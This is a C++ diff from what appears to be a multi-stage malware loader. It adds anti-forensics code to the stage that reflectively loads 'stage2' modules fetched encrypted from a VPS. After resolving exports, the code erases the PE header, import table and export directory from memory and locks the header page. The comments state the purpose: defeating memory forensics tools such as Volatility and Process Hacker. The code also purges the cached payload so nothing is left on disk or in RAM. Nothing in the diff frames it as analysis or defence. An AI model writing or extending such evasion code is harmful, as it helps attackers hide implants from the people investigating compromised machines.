@@ -598,12 +598,72 @@ private:
             return false;
         }
 
+        // Resolve shutdown export BEFORE erasing headers (pe::get_proc walks them).
+        auto shutdown_fn = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
+
+        // ── Anti-forensics: erase PE metadata from the loaded image ──────────
+        // After all exports are resolved we no longer need the PE header, import
+        // descriptors or export table. Zero them so memory forensics tools
+        // (Volatility malfind, Process Hacker dump) cannot:
+        //   1. Identify the region as a PE file (no MZ/PE signature at base)
+        //   2. Reconstruct import graph (DLL names / function hint table gone)
+        //   3. Recover export names (Stage2Init / Stage2Shutdown strings gone)
+        // The IAT (resolved function pointers), .text and .data sections remain
+        // intact — execution is unaffected.
+        if (mod.base && mod.nt) {
+            DWORD old_prot = 0;
+            uint8_t* base  = mod.base;
+
+            // Save directory locations BEFORE zeroing (mod.nt lives in the header).
+            SIZE_T hdr_sz   = mod.nt->OptionalHeader.SizeOfHeaders;
+            if (hdr_sz < 0x40 || hdr_sz > 0x10000) hdr_sz = 0x1000;
+            DWORD imp_rva = 0, imp_sz = 0, exp_rva = 0, exp_sz = 0;
+            {
+                auto& id = mod.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+                auto& ed = mod.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+                imp_rva = id.VirtualAddress; imp_sz = id.Size;
+                exp_rva = ed.VirtualAddress; exp_sz = ed.Size;
+            }
+
+            // 1. PE header (MZ + DOS stub + NT headers + section table).
+            //    PAGE_NOACCESS prevents any subsequent read of the header region.
+            VirtualProtect(base, hdr_sz, PAGE_READWRITE, &old_prot);
+            SecureZeroMemory(base, hdr_sz);
+            VirtualProtect(base, hdr_sz, PAGE_NOACCESS, &old_prot);
+            mod.nt = nullptr; // header zeroed — pointer is now invalid
+
+            // 2. Import descriptor table (DLL names + hint/name table).
+            //    The IAT (already resolved to function addresses) is tracked by
+            //    IMAGE_DIRECTORY_ENTRY_IAT — not zeroed; code still calls through it.
+            if (imp_rva && imp_sz && (size_t)(imp_rva + imp_sz) <= mod.size) {
+                uint8_t* p = base + imp_rva;
+                VirtualProtect(p, imp_sz, PAGE_READWRITE, &old_prot);
+                SecureZeroMemory(p, imp_sz);
+                VirtualProtect(p, imp_sz, PAGE_READONLY, &old_prot);
+            }
+
+            // 3. Export directory (name strings, ordinal table, AddressOfFunctions).
+            if (exp_rva && exp_sz && (size_t)(exp_rva + exp_sz) <= mod.size) {
+                uint8_t* p = base + exp_rva;
+                VirtualProtect(p, exp_sz, PAGE_READWRITE, &old_prot);
+                SecureZeroMemory(p, exp_sz);
+                VirtualProtect(p, exp_sz, PAGE_READONLY, &old_prot);
+            }
+        }
+
+        // Drop the encrypted blob from RAM — module is running, re-fetch from
+        // VPS only if the module is ever unloaded and re-requested.
+        {
+            std::lock_guard<std::recursive_mutex> lk(mu_);
+            blob_cache_.erase(module_name);
+        }
+
         auto entry = std::make_unique<LoadedStage2>();
         entry->name        = module_name;
-        entry->mod         = mod;
+        entry->mod         = mod;          // mod.nt is nullptr — header erased
         entry->init_fn     = init_fn;
-        entry->shutdown_fn = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
-        entry->cache_path.clear();   // RAM-only: no on-disk artifact to clean up
+        entry->shutdown_fn = shutdown_fn;
+        entry->cache_path.clear();         // RAM-only: no on-disk artifact
         modules_[module_name] = std::move(entry);
 
         stage1_log(1, ("stage2: loaded " + module_name).c_str());
